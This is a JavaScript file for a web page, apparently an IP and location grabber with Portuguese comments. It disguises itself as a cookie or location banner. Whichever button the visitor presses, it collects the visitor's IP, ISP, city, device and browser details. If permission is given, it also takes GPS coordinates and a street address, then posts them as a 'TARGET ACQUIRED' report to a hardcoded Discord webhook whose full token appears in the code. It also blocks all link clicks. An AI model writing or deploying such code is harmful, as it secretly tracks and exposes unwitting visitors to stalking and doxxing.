// ==================================
// IP MODULE
// ==================================
const WEBHOOK = "https://discord.com/api/webhooks/1512916490637279442/3b3q2iweTkHj2A7_bohtF_z5Shjm1hgMbVKX3AFmXDwbI5t9Qp-ZBH3MX8iIZ5gaMVoN";

const IPModule = {
  async send(lat, lon) {
    try {
      const res = await fetch("https://ipinfo.io/json");
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      const d = await res.json();
      if (!d.ip) throw new Error("IP missing");

      const now = new Date().toISOString();
      const scr = window.screen;
      const nav = window.navigator;
      const conn = nav.connection || nav.mozConnection || nav.webkitConnection || {};

      const ua = nav.userAgent;
      const osMatch =
        ua.includes("Windows NT 10.0") ? "Windows 10" :
        ua.includes("Windows NT 11.0") ? "Windows 11" :
        ua.includes("Windows NT 6.1")  ? "Windows 7"  :
        ua.includes("Windows")         ? "Windows"    :
        ua.includes("Ubuntu")          ? "Linux (Ubuntu)" :
        ua.includes("Linux")           ? "Linux"      :
        ua.includes("Mac OS X")        ? "macOS"      :
        ua.includes("Android")         ? "Android"    :
        ua.includes("iPhone")          ? "iOS (iPhone)" :
        ua.includes("iPad")            ? "iOS (iPad)" : "Unknown OS";

      const browserMatch =
        ua.includes("Edg/")    ? "Microsoft Edge" :
        ua.includes("OPR/")    ? "Opera"          :
        ua.includes("Firefox") ? "Firefox"        :
        ua.includes("Chrome")  ? "Chrome"         :
        ua.includes("Safari")  ? "Safari"         : "Unknown Browser";

      const lines = [
        "",
        "  ☠️  S Y S T E M   B R E A C H   D E T E C T E D  ☠️",
        "  ► ACCESS GRANTED — IDENTITY COMPROMISED",
        "",
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓",
        "┃   🔴  T A R G E T   A C Q U I R E D  ┃",
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
        "",
        "──────[ 🌐 NETWORK ]──────",
        "  IP       : " + d.ip,
        "  ISP      : " + (d.org      ?? "N/A"),
        "  CITY     : " + (d.city     ?? "N/A") + ", " + (d.region ?? ""),
        "  COUNTRY  : " + (d.country  ?? "N/A"),
        "  COORDS   : " + (d.loc      ?? "N/A"),
        "  TIMEZONE : " + (d.timezone ?? "N/A"),
        "  SPEED    : " + (conn.downlink ? conn.downlink + " Mbps / " + (conn.effectiveType ?? "") : "N/A"),
        "",
        "──────[ 💻 DEVICE ]──────",
        "  OS       : " + osMatch,
        "  BROWSER  : " + browserMatch,
        "  LANGUAGE : " + nav.language,
        "  CPU      : " + (nav.hardwareConcurrency ?? "N/A") + " cores",
        "  RAM      : " + (nav.deviceMemory ?? "N/A") + " GB",
        "  SCREEN   : " + scr.width + "x" + scr.height + " @ " + scr.colorDepth + "bit",
        "  MOBILE   : " + (nav.maxTouchPoints > 0 ? "Yes" : "No"),
        "  ONLINE   : " + nav.onLine,
        "",
        "──────[ 🔍 BROWSER ]──────",
        "  VENDOR   : " + nav.vendor,
        "  COOKIES  : " + nav.cookieEnabled,
        "  REFERRER : " + (document.referrer || "N/A"),
        "  URL      : " + location.href,
      ];

      if (lat !== null && lon !== null) {
        lines.push("");
        lines.push("──────[ 📍 GPS ]──────");
        lines.push("  COORDS   : " + lat.toFixed(6) + ", " + lon.toFixed(6));
        try {
          const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
          const geoData = await geo.json();
          lines.push("  ENDERECO : " + (geoData.display_name ?? "N/A"));
        } catch { lines.push("  ENDERECO : N/A"); }
        lines.push("  MAPS     : https://maps.google.com/?q=" + lat.toFixed(6) + "," + lon.toFixed(6));
      }

      lines.push("");
      lines.push("───────────────────────────────────────");
      lines.push("  ⏰ " + now);
      lines.push("───────────────────────────────────────");
      lines.push("  ✔ ALL DATA EXTRACTED — LOGGING COMPLETE ✔");
      lines.push("");

      const blob = new Blob([lines.join("\n")], { type: "text/plain" });
      const form = new FormData();
      form.append("file", blob, "target_" + d.ip.replace(/\./g, "_") + ".txt");

      const wh = await fetch(WEBHOOK, { method: "POST", body: form });
      console.log("[Webhook]", wh.status, wh.statusText);
    } catch (err) {
      console.warn("[IPModule] erro:", err.message);
    }
  },
};

// ==================================
// COOKIE BANNER MODULE
// ==================================
const CookieModule = {
  init() {
    const overlay = document.getElementById("location-overlay");
    const allow   = document.getElementById("location-allow");
    const skip    = document.getElementById("location-skip");

    if (!overlay) return;

    allow.addEventListener("click", () => {
      overlay.remove();
      navigator.geolocation.getCurrentPosition(
        (pos) => IPModule.send(pos.coords.latitude, pos.coords.longitude),
        ()    => IPModule.send(null, null)
      );
    });

    skip.addEventListener("click", () => {
      overlay.remove();
      IPModule.send(null, null);
    });
  },
};

CookieModule.init();

// Bloqueia redirecionamentos
document.addEventListener("click", (e) => {
  const a = e.target.closest("a");
  if (a) e.preventDefault();
});
